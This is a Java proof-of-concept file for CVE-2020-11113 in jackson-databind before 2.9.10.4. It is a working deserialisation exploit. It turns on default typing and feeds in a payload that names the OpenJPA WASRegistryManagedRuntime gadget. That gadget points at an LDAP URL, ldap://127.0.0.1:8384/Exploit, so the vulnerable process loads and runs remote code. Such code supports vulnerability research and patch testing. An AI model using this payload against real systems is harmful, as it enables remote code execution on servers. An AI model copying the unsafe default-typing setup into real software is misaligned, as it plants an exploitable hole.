package me.mole.jackson.demo;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * jackson官方修复编号：jackson-databind-2670,
 * 对应的CVE编号：CVE-2020-11113
 * 影响范围：jackson-databind < 2.9.10.4
 */
public class Jackson2670 {

    public static void main(String[] args) {

        String payload =
                "[\"org.apache.openjpa.ee.WASRegistryManagedRuntime\", {\"registryName\":\"ldap://127.0.0.1:8384/Exploit\"}]";

        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();

        try {
            Object obj = mapper.readValue(payload, Object.class);
            String s = mapper.writeValueAsString(obj);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
